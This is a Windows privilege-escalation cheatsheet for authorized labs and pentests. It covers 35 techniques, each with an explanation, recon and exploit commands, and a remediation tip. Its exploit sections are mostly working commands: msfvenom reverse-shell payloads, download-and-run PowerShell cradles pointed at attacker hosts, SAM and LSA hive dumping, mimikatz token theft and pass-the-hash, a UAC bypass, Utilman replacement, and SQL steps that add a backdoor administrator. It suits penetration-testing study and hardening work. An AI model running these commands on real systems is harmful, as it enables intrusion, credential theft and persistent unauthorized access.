🪟 Windows PrivEsc Cheatsheet

Why it works → Recon → Exploit → Remediation, for 30+ techniques.

Reference only — authorized labs/CTF/pentests.

Service Misconfigurations

01Unquoted Service Path

Why it works

A service path with spaces and no quotes makes Windows try each space-separated segment as an executable in order. If you can write to an early segment's folder, your planted .exe runs as the service account (often SYSTEM).

Recon

wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """

Exploit

copy malicious.exe "C:\Program.exe"
sc stop VulnSvc & sc start VulnSvc

🛡 Always quote service binary paths; restrict write access to directories in the path chain.

02Weak Service Binary Permissions

Why it works

If the service's executable file itself is writable by a low-privileged user, you can simply replace it; the service runs your replacement with the service account's privileges on next start.

Recon

icacls "C:\Program Files\VulnSvc\service.exe"
accesschk.exe -uwcqv "Users" *  (SysinternalsSuite)

Exploit

copy /y malicious.exe "C:\Program Files\VulnSvc\service.exe"
sc stop VulnSvc & sc start VulnSvc

🛡 Service binaries should be writable only by Administrators/SYSTEM.

03Weak Service Permissions (sc config / SERVICE_ALL_ACCESS)

Why it works

Services have their own DACL independent of the file DACL. If your user has SERVICE_CHANGE_CONFIG rights, you can repoint binPath to your own payload without ever touching the original file.

Recon

accesschk.exe -uwcqv "Users" VulnSvc
sc qc VulnSvc

Exploit

sc config VulnSvc binpath= "C:\temp\rev.exe" obj= LocalSystem
sc stop VulnSvc & sc start VulnSvc

🛡 Restrict service DACLs so only admins hold SERVICE_CHANGE_CONFIG/SERVICE_ALL_ACCESS.

04Weak Registry Permissions on Service Key

Why it works

Services are ultimately defined in HKLM\SYSTEM\CurrentControlSet\Services\<name>. If that registry key is writable, you can change ImagePath directly, bypassing sc's own ACL checks.

Recon

accesschk.exe -kvuqsw hklm\system\currentcontrolset\services

Exploit

reg add "HKLM\SYSTEM\CurrentControlSet\Services\VulnSvc" /v ImagePath /t REG_EXPAND_SZ /d "C:\temp\rev.exe" /f
sc stop VulnSvc & sc start VulnSvc

🛡 Lock down service registry keys to Administrators only; monitor ImagePath changes.

05SCM Permissions (full control of Service Control Manager)

Why it works

Rarely, the SCM itself is misconfigured to grant a low-priv group rights to create/modify any service — effectively full control over every service on the box, not just one.

Recon

accesschk.exe -uwcqv "Users" scmanager

Exploit

sc create newsvc binpath= "C:\temp\rev.exe" start= auto obj= LocalSystem
sc start newsvc

🛡 Default SCM DACLs should never grant SC_MANAGER_CREATE_SERVICE to non-admins.

DLL & Executable Hijacking

06DLL Hijacking (missing DLL / search order)

Why it works

When an app loads a DLL by name without a full path, Windows searches a fixed order of directories. If a privileged process looks in a writable folder before the real DLL's location, a same-named malicious DLL you plant gets loaded and executed in its context instead.

Recon

Procmon.exe   # filter: Result = NAME NOT FOUND, Path ends with .dll

Exploit

msfvenom -p windows/x64/shell_reverse_tcp LHOST=x LPORT=4444 -f dll -o missing.dll
copy missing.dll "C:\writable\path\missing.dll"
# restart/trigger the privileged process

🛡 Load DLLs with full paths; enable Safe DLL Search Mode; sign and verify DLLs.

07PATH Environment Variable Hijacking

Why it works

A scheduled task or service calls an executable by bare name and relies on PATH to resolve it. A writable directory listed earlier in PATH lets you drop a same-named malicious binary that executes instead.

Recon

echo %PATH%
icacls "C:\xampp\php" (example of a weak dir in PATH)

Exploit

copy rev.exe "C:\weak-path-dir\real-tool.exe"
# wait for the scheduled task/service to call it

🛡 Use fully-qualified paths for commands in services/tasks; keep PATH entries admin-writable only.

AlwaysInstallElevated & Installers

08AlwaysInstallElevated

Why it works

Two registry values (HKLM and HKCU) can jointly tell Windows Installer to always run .msi packages with SYSTEM privileges, regardless of who launches them — a malicious MSI then installs as SYSTEM.

Recon

reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

Exploit

msfvenom -p windows/x64/shell_reverse_tcp LHOST=x LPORT=4444 -f msi -o rev.msi
msiexec /quiet /qn /i rev.msi

🛡 Never set AlwaysInstallElevated=1 on both hives; disable via GPO unless strictly required.

Credential Hunting

09Stored Credentials (Credential Manager)

Why it works

Windows Credential Manager stores saved logons (often for scripts/RDP/mapped drives). cmdkey can enumerate stored targets, and runas with the /savecred flag lets you reuse a stored credential to launch a process as that user without ever seeing the plaintext.

Recon / Exploit

cmdkey /list
runas /savecred /user:admin "cmd.exe /c whoami"

🛡 Avoid saving privileged credentials; scope stored creds narrowly and audit regularly.

10Unattended Install Files (unattend.xml / sysprep)

Why it works

Automated-deployment files used during OS provisioning often contain the local admin password in Base64, and are sometimes left on disk after setup completes.

Recon / Exploit

dir /s /b C:\unattend.xml C:\Windows\Panther\Unattend.xml C:\Windows\system32\sysprep.inf
type C:\Windows\Panther\Unattend.xml

🛡 Delete unattend/sysprep answer files after provisioning; never store creds in plaintext/Base64 in images.

11SAM/SYSTEM Hive Dumping

Why it works

SAM holds local account hashes, encrypted with a key derived from the SYSTEM hive. With SeBackupPrivilege (or local admin) you can copy both hives offline and decrypt the hashes for offline cracking or pass-the-hash.

Exploit

reg save hklm\sam C:\temp\sam.save
reg save hklm\system C:\temp\system.save
# then offline: impacket-secretsdump -sam sam.save -system system.save LOCAL

🛡 Restrict registry hive save rights; monitor for reg save on SAM/SYSTEM/SECURITY.

12LSA Secrets Dumping

Why it works

LSA secrets in the registry store service account passwords, autologon credentials, and cached domain secrets, decryptable with admin/SeBackupPrivilege access to the SECURITY and SYSTEM hives.

Exploit

reg save hklm\security C:\temp\security.save
reg save hklm\system C:\temp\system.save
# impacket-secretsdump -security security.save -system system.save LOCAL

🛡 Minimize service accounts storing secrets in LSA; rotate regularly, restrict hive backup rights.

13Registry Autologon Credentials

Why it works

If autologon is configured, the plaintext username/password sit directly in a world-readable registry key so the OS can log the user in automatically at boot.

Recon / Exploit

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword

🛡 Don't use autologon on multi-user/shared machines; if unavoidable, restrict key ACLs and use LSA-protected storage instead.

14PowerShell History File

Why it works

PSReadLine logs every PowerShell command you type to a per-user file. Any password typed as a plaintext argument (e.g. during manual admin work) stays there indefinitely.

Recon / Exploit

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

🛡 Never pass secrets as plaintext CLI args; clear/disable PSReadLine history on privileged hosts.

15Group Policy Preferences (GPP) Cached Credentials

Why it works

Old GPP XML files (Groups.xml, etc.) stored local-account passwords encrypted with AES, but Microsoft published the static key years ago (MS14-025) — anyone who finds the cpassword can decrypt it instantly.

Recon / Exploit

findstr /S /I cpassword \\domain\SYSVOL\domain\Policies\*.xml
gpp-decrypt <cpassword-blob>

🛡 Apply MS14-025; remove any legacy GPP-stored passwords from SYSVOL, use LAPS instead.

16Sensitive File/Folder Permissions (web configs, scripts)

Why it works

Application config files, deployment scripts, and backups often embed plaintext database/service credentials, readable by any local user if ACLs weren't tightened after deployment.

Recon / Exploit

findstr /SIM /C:"password" *.xml *.ini *.txt *.config *.ps1 2>nul
icacls C:\inetpub\wwwroot\web.config

🛡 Restrict config file ACLs to the owning service account; store secrets in a vault, not plaintext files.

Scheduled Tasks & Autoruns

17Scheduled Task Weak Permissions

Why it works

A scheduled task configured to run as SYSTEM/admin executes whatever script/binary it points to on its own schedule. If that target file is writable by a low-priv user, editing it gets your code run with the task's privileges.

Recon

schtasks /query /fo LIST /v
icacls C:\scripts\backup.ps1

Exploit

echo IEX(New-Object Net.WebClient).DownloadString('http://x/rev.ps1') >> C:\scripts\backup.ps1
# wait for the scheduled trigger

🛡 Restrict write access to any script/binary referenced by a privileged scheduled task.

18Startup Folder / Run Key Weak Permissions

Why it works

Anything in the all-users Startup folder or an HKLM Run key launches automatically whenever any user (including an admin) logs in. If that folder/key is writable, you plant a payload that fires on the next privileged login.

Recon

icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

Exploit

copy rev.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\update.exe"

🛡 Restrict write access on global Startup folders/Run keys to Administrators only.

Token & Privilege Abuse

19SeImpersonatePrivilege (PrintSpoofer / JuicyPotato / RoguePotato)

Why it works

Service accounts often hold SeImpersonatePrivilege for legitimate reasons. Potato-family tools trick a SYSTEM-owned component (spooler, DCOM, NTLM relay) into authenticating to a local listener, letting you capture and impersonate its SYSTEM token.

Recon

whoami /priv   # look for SeImpersonatePrivilege = Enabled

Exploit

PrintSpoofer.exe -i -c cmd
# or: JuicyPotatoNG.exe -t * -p C:\rev.exe -a ""

🛡 Patch spooler/DCOM-related CVEs; only assign SeImpersonatePrivilege to accounts that truly need it.

20SeDebugPrivilege (process injection into SYSTEM process)

Why it works

This privilege lets a process open a handle to any other process, including SYSTEM-owned ones, regardless of ACLs — enabling code/token injection straight into a privileged process.

Recon

whoami /priv   # SeDebugPrivilege = Enabled

Exploit

# mimikatz:
privilege::debug
token::elevate

🛡 Restrict SeDebugPrivilege to true administrators; monitor OpenProcess calls against lsass.exe/winlogon.exe.

21SeBackupPrivilege Abuse

Why it works

This privilege bypasses normal file-read ACLs for backup purposes, so it can copy protected files like SAM/SYSTEM/NTDS.dit directly, even though your account couldn't normally open them.

Exploit

robocopy /b C:\Windows\System32\config C:\temp sam system
# then offline: impacket-secretsdump -sam sam -system system LOCAL

🛡 Grant SeBackupPrivilege only to dedicated backup-operator accounts, never to general admin groups.

22SeRestorePrivilege Abuse

Why it works

This privilege bypasses normal write-ACLs for restore operations, letting you overwrite any file on disk — including a privileged service's binary — with an attacker-controlled one.

Exploit

# overwrite a SYSTEM-run service binary, e.g. utilman.exe, using SeRestorePrivilege-aware tooling
# (SeBackupPrivilegeCmdLets / SetFilePointerEx-based overwrite), then trigger the service

🛡 Grant SeRestorePrivilege sparingly; monitor overwrite of system binaries by non-standard processes.

23SeTakeOwnershipPrivilege Abuse

Why it works

This privilege lets you become the owner of any object regardless of its current ACL — once you own a protected file (e.g. a service binary), you can grant yourself full control and overwrite it.

Exploit

takeown /f C:\Windows\System32\Utilman.exe
icacls C:\Windows\System32\Utilman.exe /grant %username%:F
copy /y cmd.exe C:\Windows\System32\Utilman.exe
# lock screen, click Ease of Access -> SYSTEM cmd

🛡 Restrict SeTakeOwnershipPrivilege to true admins; monitor takeown/icacls on system binaries.

24SeLoadDriverPrivilege (vulnerable/malicious driver load)

Why it works

This privilege lets you load kernel drivers. Loading a known-vulnerable signed driver (BYOVD) or a crafted one gives you kernel-mode code execution — game over for any permission model.

Exploit

whoami /priv   # SeLoadDriverPrivilege = Enabled
# e.g. load Capcom.sys and trigger its known IOCTL to execute arbitrary code at kernel level

🛡 Restrict SeLoadDriverPrivilege; maintain a vulnerable-driver blocklist (Microsoft's recommended driver block rules).

UAC & GUI Abuse

25UAC Bypass (fodhelper.exe registry hijack)

Why it works

Certain auto-elevating Windows binaries (fodhelper, eventvwr, sdclt) check a per-user registry key before launching their companion program — without validating it's legitimate. A crafted HKCU key runs your payload with the auto-elevated token.

Exploit

reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ /d "" /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /d "C:\temp\rev.exe" /f
fodhelper.exe

🛡 Keep UAC at the highest setting; patch auto-elevate binaries; monitor HKCU\...\ms-settings registry writes.

26Insecure GUI Apps Running as SYSTEM (file-dialog shell escape)

Why it works

A GUI application launched as SYSTEM (e.g. from a support/kiosk account) often exposes a standard File > Open/Save dialog, which is a full Explorer window underneath — you can navigate it to run cmd.exe, inheriting SYSTEM.

Exploit

# in the file dialog's address bar:
cmd.exe

🛡 Avoid running full GUI apps as SYSTEM for low-trust users; restrict kiosk accounts with AppLocker.

Kernel & Network

27Kernel Exploits (missing patches)

Why it works

Unpatched Windows kernel bugs (e.g. MS16-032, CVE-2021-1732) let any local user corrupt kernel memory or abuse a logic flaw to directly gain SYSTEM, bypassing every userland permission check.

Recon

systeminfo
wmic qfe list
Sherlock.ps1 / Watson.exe

Exploit

Invoke-MS16-032.ps1   # example, match CVE to patch level

🛡 Keep systems fully patched; use virtual patching/EDR where immediate patching isn't possible.

28Print Spooler (PrintNightmare, CVE-2021-34527)

Why it works

A flaw in the print spooler's RPC interface lets a low-privileged (even remote) user install a malicious printer driver, which the spooler then loads and executes as SYSTEM.

Exploit

Invoke-Nightmare -DriverName "Xerox" -NewUser attacker -NewPassword Pass123!

🛡 Patch the spooler CVE; disable the Print Spooler service on servers that don't need it.

29NTLM Relay / Hot Potato Family

Why it works

Windows services can be coerced into authenticating over SMB/HTTP to an attacker-controlled listener using NTLM. Relaying that authentication to a local privileged endpoint executes commands as SYSTEM.

Exploit

Responder.py / ntlmrelayx.py pointed at a coerced SYSTEM auth (e.g. via spoolsample / PetitPotam)

🛡 Enable SMB signing and EPA; disable NTLM where possible; patch coercion vectors (PetitPotam, PrinterBug).

Automated Enumeration

30Automated PrivEsc Enumeration (WinPEAS / PowerUp / Seatbelt)

Why it works

These tools run every manual check above (services, registry, tasks, tokens, credentials) automatically and flag anything exploitable — same logic an attacker uses, so running it yourself finds the gaps first.

Recon

winPEASx64.exe
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://x/PowerUp.ps1'); Invoke-AllChecks"
Seatbelt.exe -group=all

🛡 Run these as a routine blue-team audit; remediate every finding before an attacker enumerates the same box.

31Named Pipe Impersonation (custom service pipes)

Why it works

A privileged process that creates a named pipe without restricting who can connect lets a low-priv client connect first and call ImpersonateNamedPipeClient when the privileged side connects back — capturing its token.

Exploit

# create/listen on the pipe before the privileged service does, then trigger it to connect,
# then call ImpersonateNamedPipeClient() in your listener to steal its SYSTEM token

🛡 Set explicit, restrictive security descriptors on named pipes created by privileged services.

32Pass-the-Hash with Dumped Credentials

Why it works

NTLM authentication only needs the password hash, not the plaintext — a hash dumped via SAM/LSA/mimikatz can be replayed directly to authenticate as that user on other services/hosts without ever cracking it.

Exploit

impacket-psexec -hashes :<NTLMhash> administrator@target
# or mimikatz: sekurlsa::pth /user:admin /domain:. /ntlm:<hash> /run:cmd.exe

🛡 Enable Credential Guard; disable NTLM where feasible; use unique local admin passwords (LAPS) to stop lateral PtH.

Database Service Abuse

33MySQL UDF Privilege Escalation (Windows)

Why it works

If the MySQL service runs as SYSTEM/admin and the root account has no password (or you have FILE privilege), you can register a User Defined Function backed by a DLL you upload into the plugin directory. Once created, calling that function runs arbitrary OS commands with mysqld's privileges — often SYSTEM.

Recon

mysql -u root -h target          # try blank password
SELECT @@version_compile_os, @@plugin_dir;   # confirm Windows + find plugin dir

Exploit

# upload lib_mysqludf_sys.dll (from the sqlmap/metasploit UDF repo) into the plugin dir, then:
use mysql;
CREATE TABLE npn(line blob);
INSERT INTO npn VALUES(load_file('C:\\temp\\lib_mysqludf_sys.dll'));
SELECT * FROM npn INTO DUMPFILE 'C:\\Program Files\\MySQL\\MySQL Server\\lib\\plugin\\lib_mysqludf_sys.dll';
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys.dll';
SELECT sys_eval('whoami');
SELECT sys_eval('net user backdoor Passw0rd! /add');
SELECT sys_eval('net localgroup administrators backdoor /add');

🛡 Set a strong MySQL root password, run mysqld under a dedicated low-privilege service account (not SYSTEM), revoke FILE privilege from app accounts, restrict write access to the plugin directory.

34MSSQL xp_cmdshell

Why it works

SQL Server's xp_cmdshell extended stored procedure runs OS commands under the SQL Server service account. It's disabled by default, but sysadmin-role logins can re-enable it themselves — and that service account is frequently SYSTEM or a highly privileged domain account.

Recon

sqlcmd -S target -U sa -P password -Q "SELECT IS_SRVROLEMEMBER('sysadmin')"

Exploit

EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'net user backdoor Passw0rd! /add && net localgroup administrators backdoor /add';

🛡 Keep xp_cmdshell disabled; run SQL Server under a least-privilege service account; restrict sysadmin role membership; audit sp_configure changes.

Tooling

35Cross-Compiling Payloads for Windows (mingw-w64)

Why it works

Exploit PoCs (kernel exploits, UDF DLLs, potato tools) are often distributed as C/C++ source. Your attack box is usually Linux, not Windows, so you cross-compile the Windows PE binary/DLL locally with mingw-w64 instead of needing a Windows build environment, then transfer the finished .exe/.dll to the target.

Setup

sudo apt install mingw-w64
# toolchain binaries: x86_64-w64-mingw32-gcc (64-bit), i686-w64-mingw32-gcc (32-bit)

Compile — EXE

x86_64-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32
# 32-bit target:
i686-w64-mingw32-gcc exploit.c -o exploit32.exe -lws2_32

Compile — DLL (e.g. a UDF or hijack payload)

x86_64-w64-mingw32-gcc -shared -o payload.dll payload.c
i686-w64-mingw32-gcc -shared -o payload32.dll payload.c

Transfer & run

python3 -m http.server 80
# on target (PowerShell):
Iwr -Uri http://attacker/exploit.exe -OutFile C:\temp\exploit.exe
C:\temp\exploit.exe

🛡 This is an attacker tooling step, not a target misconfig — defend via application control (AppLocker/WDAC), EDR behavioral detection, and blocking unsigned/unexpected binaries from running.
